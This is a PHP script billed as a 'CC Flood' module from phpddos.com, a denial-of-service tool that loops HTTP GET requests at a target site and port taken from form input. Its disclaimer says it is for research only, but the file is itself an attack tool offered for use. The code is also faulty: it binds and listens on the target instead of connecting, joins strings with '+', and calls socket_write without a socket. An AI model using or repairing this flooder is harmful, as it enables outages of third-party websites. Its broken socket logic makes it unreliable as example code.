<?php
echo "状态 : 正常运行中.....<br>";
echo "================================================<br>";
echo "  <font color=blue>www.phpddos.com<br>";
echo "  CC Flood 模块<br>";
echo "  作者：ybhacker<br>";
echo "  警告：本程序带有攻击性,仅供安全研究与教学之用,风险自负!</font><br>";
echo "================================================<br><br>";
error_reporting(E_ALL);  //提示错误信息
set_time_limit(0);     //设定一个程式所允许执行的秒数   0 是无限循环
ob_implicit_flush();     // 刷新输出缓冲
$address = $_POST['site'];  // 网站地址
$port = $_POST['port'];      // 端口
$dongu = $_POST['dongu'];   //循环次数
$sayi = 1;

while ( $sayi <= $dongu )   //变量asyi小于 循环次数变量 dongu 才会继续循环
{
	if (($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) {
		echo "HaHa\n";
	}

	if (socket_bind($sock, $address, $port) === false) {       // 连接端口
		echo "HaHa\n";
	}

	if (socket_listen($sock, 5) === false) {
		echo "HaHa\n";
	}
		$msg = "HTTP/1.1 GET /\r\nHost:"+$_GET['site']+"\r\nConnection: Keep-Alive\r\n";
		socket_write($msg);
		socket_close($sock);
		$sayi++;   // 循环一次 变量sayi 加1
		echo "Goodbye...".$sayi;   // 输出循环次数
}
?>